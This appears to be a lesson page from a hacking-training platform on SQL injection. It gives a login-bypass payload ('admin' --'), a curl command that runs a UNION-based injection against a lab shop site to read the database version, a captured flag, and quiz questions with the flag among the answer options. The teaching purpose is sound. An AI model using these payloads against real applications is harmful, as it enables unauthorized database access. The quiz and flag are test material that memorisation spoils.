# SQL Injection (SQLi)

The king of web vulnerabilities.
SQLi allows an attacker to interfere with the queries an application makes to its database.

## The Theory

Code: `SELECT * FROM users WHERE user = '$username' AND pass = '$password'`

Attack: `admin' --`

Result Code: `SELECT * FROM users WHERE user = 'admin' --' AND pass = '...'`
The `--` comments out the rest of the query (the password check). You log in as admin without a password.

## Types of SQLi

1.  **In-Band (Classic):** You see the results on the screen (UNION based).
2.  **Error-Based:** The database errors tell you structure.
3.  **Blind:** No visual output. You deduce truth based on delays or true/false behavior.

## Lab: UNION Attack

We need to extract the version of the database.
Goal: Making the number of columns match.

<TerminalWindow 
  cmd="curl 'http://shop.breachlabs.io/search?q=a%27+UNION+SELECT+1,@@version,3,4--'" 
  output="Search Results:
1. Product ID: 1
   Name: 5.7.35-0ubuntu0.18.04.1
   Price: 3
   Rating: 4

Flag: BL{Un10n_S3l3ct_M4st3r}" 
/>

By injecting `UNION SELECT`, we appended the database version (`@@version`) into the product name field.

<Quiz 
  question="Which character is commonly used to comment out the rest of an SQL query?"
  options={[
    "# or --",
    "//",
    "<!-- -->",
    "/* */"
  ]}
/>

<Quiz 
  question="What is the flag found via UNION injection?"
  options={[
    "BL{SQL_Inject10n_K1ng}",
    "BL{Un10n_S3l3ct_M4st3r}",
    "5.7.35",
    "admin"
  ]}
/>
